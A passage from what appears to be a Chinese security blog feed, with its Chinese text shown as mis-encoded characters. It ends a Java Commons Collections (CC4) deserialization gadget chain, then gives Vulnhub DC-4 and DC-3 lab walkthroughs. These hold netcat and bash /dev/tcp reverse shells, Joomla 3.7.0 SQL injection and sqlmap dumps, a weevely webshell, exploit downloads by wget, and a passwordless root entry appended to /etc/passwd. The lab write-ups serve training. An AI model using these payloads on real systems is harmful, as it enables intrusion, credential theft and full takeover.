</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates,codes);  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),  </span><br><span class="line">                instantiateTransformer  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));  </span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);  </span><br><span class="line">  </span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);  </span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> transformingComparator.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">transformField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);  </span><br><span class="line">        transformField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        transformField.set(transformingComparator, chainedTransformer);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//        serialize(priorityQueue);  </span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307051249793.png" alt="image-20230705124940577"></p><h2 id="æµç¨‹å›¾"><a href="#æµç¨‹å›¾" class="headerlink" title="æµç¨‹å›¾"></a>æµç¨‹å›¾</h2><p>æ„Ÿè§‰CC4å­¦çš„æŒºè½»æ¾çš„ï¼Œä¸è¿‡å‰é¢çš„æœ‰äº›ä¸œè¥¿å¿˜è®°äº†ï¼Œè¿˜æ˜¯è¦å¤šæ€»ç»“ï¼Œæµç¨‹å›¾å¦‚ä¸‹ï¼Œç›´æ¥ç”»åœ¨ä¸€å †äº†ä¸å•ç‹¬ç”»äº†<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307062015392.png" alt="image-20230706201426369"></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-DC-4</title>
      <link href="/2023/07/Vulnhub-DC-4/"/>
      <url>/2023/07/Vulnhub-DC-4/</url>
      
        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h2><p>ä¸‹è½½åœ°å€ï¼š<a href="https://www.vulnhub.com/entry/dc-4,313/">https://www.vulnhub.com/entry/dc-4,313/</a></p><h2 id="å¼€å§‹æ‰“é¶"><a href="#å¼€å§‹æ‰“é¶" class="headerlink" title="å¼€å§‹æ‰“é¶"></a>å¼€å§‹æ‰“é¶</h2><p>æ‰«æå­˜æ´»IP<br><code>arp-scan -l</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042110558.png" alt="image-20230704210958475"><br>è®¿é—®å‡ºç°ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œæˆ‘çš„7ä¸‡æ•°æ®å¤§å­—å…¸éƒ½æ²¡çˆ†å‡ºæ¥ã€‚ã€‚ã€‚éš¾é“ä¸æ˜¯å¼±å£ä»¤ï¼Ÿï¼Ÿé admin&#x2F;adminè¿›å»äº†ï¼Œæˆ‘çš„å¤§å­—å…¸æ²¡æœ‰ï¼Ÿï¼Ÿä»”ç»†æŸ¥çœ‹å‘ç°æ ¹æœ¬æ²¡åšå¯†ç éªŒè¯ã€‚ã€‚ã€‚<br>è¿›å…¥å¯ä»¥æ‰§è¡Œä¸‰ä¸ªLinuxå‘½ä»¤<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042111368.png" alt="image-20230704211027412"><br>æŠ“ä¸ªåŒ…å‘ç°æ˜¯ä»»æ„ä»£ç æ‰§è¡Œï¼Œç›´æ¥å†™å…¥webshellå‘ç°å­˜åœ¨è¿‡æ»¤<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042110895.png" alt="image-20230704211037843"><br>base64ä¹‹åæ˜¾ç¤ºå†™å…¥æˆåŠŸï¼Œä½†æ˜¯æŸ¥çœ‹åˆæ²¡æœ‰æ–‡ä»¶å°±å¾ˆå¥‡æ€ªï¼Œçœ‹äº†wpå‘ç°ç›´æ¥å¼¹shellï¼Œä¹Ÿå¯¹å•Šï¼Œéƒ½èƒ½å‘½ä»¤æ‰§è¡Œäº†ä¸ºå•¥ä¸è¯•è¯•å¼¹ä¸ªshellå‘¢ã€‚ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">radio=nc+192.168.75.128+6666+-e+/bin/bash&amp;submit=Run</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042111871.png" alt="image-20230704211134821"><br>ç„¶åç”¨pythonè·å–ä¸ªäº¤äº’å¼shellï¼ŒæŸ¥çœ‹rootæ²¡æœ‰æƒé™</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042112524.png" alt="image-20230704211155202"></p><h2 id="eximææƒ"><a href="#eximææƒ" class="headerlink" title="eximææƒ"></a>eximææƒ</h2><p>ç„¶åå°±æ˜¯ææƒäº†ï¼ŒæŸ¥çœ‹å…·æœ‰suidæƒé™çš„å‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042112458.png" alt="image-20230704211250399"><br>å­˜åœ¨exim4è¿™ä¸ªå¯ä»¥ç”¨æ¥ææƒï¼ŒæŸ¥çœ‹ä¸€ä¸‹ç‰ˆæœ¬<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042113715.png" alt="image-20230704211301624"><br>ç„¶åmsfç›´æ¥æœç›¸å¯¹åº”çš„exp<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042113333.png" alt="image-20230704211312249"><br>æˆ‘è¿™é‡Œå°†expå¤åˆ¶åˆ°äº†æˆ‘çš„ç”¨æˆ·ç›®å½•ä¸‹ï¼Œç„¶åç”¨pythonèµ·äº†ä¸€ä¸ªä¸´æ—¶æœåŠ¡ï¼Œå†åœ¨é¶æœºä¸Šä½¿ç”¨wgetä¸‹è½½expåˆ°tmpç›®å½•ä¸‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042113032.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-4:/tmp$ wget http://192.168.75.128:8000/46996.sh</span><br><span class="line">wget http://192.168.75.128:8000/46996.sh</span><br><span class="line">--2023-07-04 22:29:12--  http://192.168.75.128:8000/46996.sh</span><br><span class="line">Connecting to 192.168.75.128:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 3552 (3.5K) [text/x-sh]</span><br><span class="line">Saving to: &#x27;46996.sh&#x27;</span><br><span class="line"></span><br><span class="line">46996.sh            100%[===================&gt;]   3.47K  --.-KB/s    in 0s      </span><br><span class="line"></span><br><span class="line">2023-07-04 22:29:12 (62.2 MB/s) - &#x27;46996.sh&#x27; saved [3552/3552]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042113307.png" alt="image-20230704211335280"><br>ç„¶åç»™æ–‡ä»¶èµ‹æ‰§è¡Œæƒé™å†è¿è¡Œå³å¯æå‡åˆ°root</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x 46996.sh</span><br><span class="line">./46996.sh</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042113770.png" alt="image-20230704211344723"><br>rootç›®å½•ä¸‹å¾—åˆ°flag<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042113536.png" alt="image-20230704211352490"></p><h2 id="teeheeææƒ"><a href="#teeheeææƒ" class="headerlink" title="teeheeææƒ"></a>teeheeææƒ</h2><p>è¿™é‡Œæˆ‘ç›´æ¥è®°å½•ææƒçš„ä¸€éƒ¨åˆ†äº†ï¼Œå‰é¢çš„ç›´æ¥çœç•¥äº†ï¼Œæ„Ÿå…´è¶£å¯ä»¥åœ¨ç½‘ä¸Šçœ‹å…¶ä»–çš„wpï¼Œé€šè¿‡å‰é¢çš„æ“ä½œå¯ä»¥å¾—åˆ°charlesç”¨æˆ·çš„å¯†ç å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su charles</span><br><span class="line">^xHhA&amp;hvim0y  #å¯†ç </span><br></pre></td></tr></table></figure><p>åˆ‡æ¢åˆ°è¿™ä¸ªç”¨æˆ·ä½¿ç”¨å‘½ä»¤<code>sudo -l</code>æŸ¥çœ‹å…·æœ‰rootæƒé™çš„å‘½ä»¤<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042114230.png" alt="image-20230704211405178"><br>å‘ç°æœ‰ä¸ªteeheeå‘½ä»¤<br><strong>teeheeå‘½ä»¤å¯ä»¥å†™å…¥æ–‡ä»¶å†…å®¹å¹¶ä¸è¦†ç›–æ–‡ä»¶åŸæœ‰å†…å®¹</strong><br>å¯ä»¥ç”¨è¿™ä¸ªå‘½ä»¤å†™å…¥ä¸€ä¸ªæ— å¯†ç çš„adminç”¨æˆ·åˆ°&#x2F;etc&#x2F;passwdæ–‡ä»¶ï¼Œå¹¶åŠ å…¥åˆ°rootç»„ä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;admin::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042114723.png" alt="image-20230704211410690"><br>ç„¶ååˆ‡æ¢åˆ°adminç”¨æˆ·æˆåŠŸå˜ä¸ºrootæƒé™<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042114681.png" alt="image-20230704211418608"></p>]]></content>
      
      
      <categories>
          
          <category> é¶æœº </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub--DC-3</title>
      <link href="/2023/07/Vulnhub-DC-3/"/>
      <url>/2023/07/Vulnhub-DC-3/</url>
      
        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h2><p>ä¸‹è½½åœ°å€ï¼š<a href="http://www.five86.com/downloads/DC-3-2.zip">http://www.five86.com/downloads/DC-3-2.zip</a><br>é•œåƒåœ°å€ï¼š<a href="https://download.vulnhub.com/dc/DC-3-2.zip">https://download.vulnhub.com/dc/DC-3-2.zip</a><br>åœ¨æ‰“å¼€çš„æ—¶å€™å‡ºäº†ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚ä¸‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031340292.png" alt="image-20230703133956196"><br>è§£å†³æ–¹æ³•ï¼šåœ¨CD&#x2F;DVDé«˜çº§è®¾ç½®é‡Œé¢æ”¹ä¸ºå¦‚ä¸‹å³å¯<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031340610.png" alt="image-20230703134012551"></p><h2 id="å¼€å§‹æ‰“é¶"><a href="#å¼€å§‹æ‰“é¶" class="headerlink" title="å¼€å§‹æ‰“é¶"></a>å¼€å§‹æ‰“é¶</h2><p>ä»DC-3å¼€å§‹åªæœ‰ä¸€ä¸ªflagï¼Œå¾—ææƒåˆ°rootæ‰èƒ½æ‹¿åˆ°<br>æ‰«æå­˜æ´»IPï¼Œè®°å¾—æ”¹ä¸ºNATè¿æ¥<br><code>arp-scan -l</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031340977.png" alt="image-20230703134029937"><br>IPä¸º<strong>192.168.75.136</strong><br>æ¢æµ‹ä¸€ä¸‹å­˜æ´»ç«¯å£<br><code>nmap -A 192.168.75.136 </code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031340327.png"><br>æ‰«ä¸€ä¸‹ç›®å½•çœ‹çœ‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031341959.png" alt="image-20230703134126915"><br>æœ‰ä¸ªåå°ï¼Œå…ˆæ”¾ç€ï¼Œè®¿é—®ä¸€ä¸‹IPåˆ©ç”¨æ’ä»¶å‘ç°CMSä¸ºJoomla<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031341778.png" alt="image-20230703134155733"></p><h2 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h2><p>çœ‹ä¸‹æœ‰æ²¡æœ‰å†å²æ¼æ´ï¼Œå‘ç°å­˜åœ¨sqlæ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.75.136/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,database()),1)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031342864.png" alt="image-20230703134218819"><br>ç„¶åç”¨sqlmapä¸€æŠŠæ¢­çœ‹çœ‹æœ‰ä»€ä¹ˆä¸œè¥¿å§ï¼Œå°†æ•°æ®åŒ…ä¿å­˜åœ¨æ³¨å…¥çš„å‚æ•°åŠ ä¸ª<code>*</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031342657.png" alt="image-20230703134236625"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r &quot;/home/joker27/æ¡Œé¢/111.txt&quot; --dbs</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031342672.png" alt="image-20230703134249625"><br>åˆ°è¿™é‡Œå°±æ²¡å•¥åˆ©ç”¨æ€è·¯äº†ï¼Œè¡¨å®åœ¨å¤ªå¤šäº†ï¼Œæ‡’å¾—ä¸€ä¸ªä¸ªçŒœï¼Œçœ‹çœ‹wpå§ï¼Œå‘ç°æœ‰ä¸ªä¸“é—¨é’ˆå¯¹joomlaçš„å·¥å…·å®‰è£…ä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install joomscan</span><br></pre></td></tr></table></figure><p>å¼€æ‰«<code>joomscan -u http://192.168.75.136</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031343261.png" alt="image-20230703134305215"><br>çœ‹åˆ°äº†ç‰ˆæœ¬ä¸º3.7.0ï¼Œè¿™ä¸ªç‰ˆæœ¬æœ‰sqlæ³¨å…¥å‰é¢å·²ç»åˆ©ç”¨è¿‡äº†ï¼Œä»wpå¾—çŸ¥å¯†ç åœ¨<code>#__users</code>è¡¨ä¸­ï¼Œæœ¬æ¥æƒ³é€šè¿‡æˆ‘å‰é¢çš„æ³¨å…¥æ–¹æ³•ç›´æ¥æŸ¥çœ‹çš„ï¼Œä½†æ˜¯å‘ç°æ²¡æ³•æŸ¥çœ‹æ•°æ®äº†ï¼Œåªèƒ½é€šè¿‡msfæ¥çœ‹ä¸€ä¸‹äº†ï¼Œæ²¡æ€ä¹ˆç”¨è¿‡msféƒ½ä¸å¤ªç†Ÿç»ƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit joomla 3.7.0</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031343141.png" alt="image-20230703134335109"><br>çœ‹wpè¿™é‡Œä¸èƒ½ç”¨msfç›´æ¥æ‰“ï¼Œæ‰€ä»¥å°±ç›´æ¥çœ‹çœ‹payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/share/exploitdb/exploits/php/webapps/42033.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031343915.png" alt="image-20230703134346862"><br>å› ä¸ºå‰é¢çš„ä¸œè¥¿éƒ½å·²ç»æ³¨å‡ºæ¥äº†æ‰€ä»¥ç›´æ¥æ³¨åˆ—å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.136/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb -T &#x27;#__users&#x27; --columns -p list[fullordering]</span><br></pre></td></tr></table></figure><p>å¾—åˆ°åˆ—å<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031344803.png" alt="image-20230703134406761"><br>æ¥ä¸‹æ¥æŸ¥çœ‹æ•°æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.136/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb -T &#x27;#__users&#x27; -C name,password,username --dump -p list[fullordering]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031344583.png" alt="image-20230703134421547"><br>å¯†ç æ˜¯åŠ å¯†çš„ç”¨johnçˆ†ç ´ä¸€ä¸‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031345400.png" alt="image-20230703134432752"><br>å¾—åˆ°å¯†ç snoopyï¼Œç™»å½•ä¸€ä¸‹åå°ï¼ŒæˆåŠŸç™»å½•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031345190.png" alt="image-20230703134547119"></p><h2 id="æ‹¿shell"><a href="#æ‹¿shell" class="headerlink" title="æ‹¿shell"></a>æ‹¿shell</h2><p>æ¥ä¸‹æ¥æ‰¾æ‰¾æœ‰æ²¡æœ‰ä¸Šä¼ ç‚¹å•¥çš„ï¼Œæœ€ç»ˆåœ¨ä¸‹é¢è¿™é‡Œå‘ç°å¯ä»¥ç›´æ¥ç”Ÿæˆæ–‡ä»¶<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031346665.png" alt="image-20230703134607616"><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031346305.png" alt="image-20230703134618256"><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031346130.png" alt="image-20230703134633073"><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031346542.png" alt="image-20230703134644502"><br>å®³ï¼Œæ‰¾è·¯å¾„æ‰¾äº†åŠå¤©ã€‚ã€‚ã€‚<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031346356.png" alt="image-20230703134658292"><br>æˆ‘è¿™å°æœºå™¨æ²¡è£…èšå‰‘æ¢ä¸ªå·¥å…·ï¼Œåˆ©ç”¨kaliè‡ªå¸¦çš„weevely</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely generate cmd shell.php //ç”Ÿæˆshell</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031347730.png" alt="image-20230703134712673"><br>ä½†æ˜¯ç›´æ¥ä¸Šä¼ å¤±è´¥ä¼°è®¡é™åˆ¶äº†ï¼Œé‚£ä¹ˆå°±ç›´æ¥å°†ä»£ç å¤åˆ¶åˆ°ä¹‹å‰çš„é‚£ä¸ª1.phpé‡Œé¢<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031347122.png" alt="image-20230703134729073"><br>è¿æ¥æˆåŠŸ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely http://192.168.75.136/templates/bezz3/1.php cmd  //è¿æ¥</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031348106.png" alt="image-20230703134812024"><br>ä½¿ç”¨å‘½ä»¤<code>cat /etc/issue</code>æŸ¥çœ‹ç³»ç»Ÿå‘è¡Œç‰ˆæœ¬ä¿¡æ¯<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031351895.png" alt="image-20230703135102848"></p><h2 id="æ‹’ç»æœåŠ¡æ¼æ´ææƒ-é€šè¿‡weevelyè¿›è¡Œç»“æœå¤±è´¥"><a href="#æ‹’ç»æœåŠ¡æ¼æ´ææƒ-é€šè¿‡weevelyè¿›è¡Œç»“æœå¤±è´¥" class="headerlink" title="æ‹’ç»æœåŠ¡æ¼æ´ææƒ (é€šè¿‡weevelyè¿›è¡Œç»“æœå¤±è´¥)"></a>æ‹’ç»æœåŠ¡æ¼æ´ææƒ (é€šè¿‡weevelyè¿›è¡Œç»“æœå¤±è´¥)</h2><p>ç„¶åæœ¬åœ°å¯»æ‰¾ç›¸å…³ææƒæ¼æ´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Ubuntu 16.04</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031351957.png" alt="image-20230703135118863"><br>æŸ¥çœ‹è¿™ä¸ªæ¼æ´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/share/exploitdb/exploits/linux/local/39772.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031351160.png" alt="image-20230703135132114"><br>ä½¿ç”¨wgetå°†expä¸‹è½½åˆ°é¶æœº<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031352767.png" alt="image-20230703135202692"><br>çœ‹wpçš„æ—¶å€™ç‰ˆæœ¬ä¸ä¸€æ ·çš„è¯è¿™é‡Œæœ‰è¿™é‡Œé“¾æ¥æœ‰å¯èƒ½å¤±æ•ˆï¼Œæˆ‘è¿™ä¸ªåº”è¯¥å¯ä»¥ï¼Œå¦‚æœä¸‹è½½å¤±è´¥å¯ä»¥æ¢ä¸ªé“¾æ¥è¯•è¯•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://gitee.com/aaaddc/exploitdb-bin-sploits/blob/master/bin-sploits/39772.zip</span><br></pre></td></tr></table></figure><p>ç„¶åè§£å‹<code>unzip 39772.zip</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031353220.png" alt="image-20230703135310168"><br>è¿›å…¥39772ç›®å½•è§£å‹<code>exploit.tar</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xvf exploit.tar</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031353416.png" alt="image-20230703135326366"><br>è¿›å…¥è§£å‹åçš„ç›®å½•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031353970.png" alt="image-20230703135340924"><br>è¿è¡Œ<code>compile.sh</code>ç¼–è¯‘æ–‡ä»¶<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031353998.png" alt="image-20230703135351940"><br>ç„¶åæ‰§è¡Œ<code>./doubleput</code>ææƒ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031354358.png" alt="image-20230703135404296"><br>è¿™é‡Œæ‰§è¡Œå¤±è´¥äº†ï¼Œçœ‹äº†wpæœ‰çš„äººè¿™é‡Œä¹Ÿå¤±è´¥äº†ä¼°è®¡è¿™ä¸ªweevelyä¸å¤ªè¡Œ</p><h2 id="æ”¾å¼ƒweevelyé€šè¿‡åå¼¹shellè¿›è¡Œ"><a href="#æ”¾å¼ƒweevelyé€šè¿‡åå¼¹shellè¿›è¡Œ" class="headerlink" title="æ”¾å¼ƒweevelyé€šè¿‡åå¼¹shellè¿›è¡Œ"></a>æ”¾å¼ƒweevelyé€šè¿‡åå¼¹shellè¿›è¡Œ</h2><p>æ²¡åŠæ³•åªèƒ½æ¢ä¸ªæ–¹å¼äº†ï¼Œç›´æ¥åå¼¹ä¸ªshellåˆ°kaliä¸Šå§</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.75.128/6666 0&gt;&amp;1&#x27; &quot;);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031354597.png" alt="image-20230703135415550"><br>è®¿é—®é¡µé¢æ‹¿åˆ°shellï¼Œå› ä¸ºå‰é¢æ–‡ä»¶å·²ç»ä¸Šä¼ æ‰€ä»¥è¿™é‡Œç›´æ¥æ‰¾åˆ°æ–‡ä»¶æ‰§è¡Œå‘½ä»¤å°±è¡Œ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031354899.png" 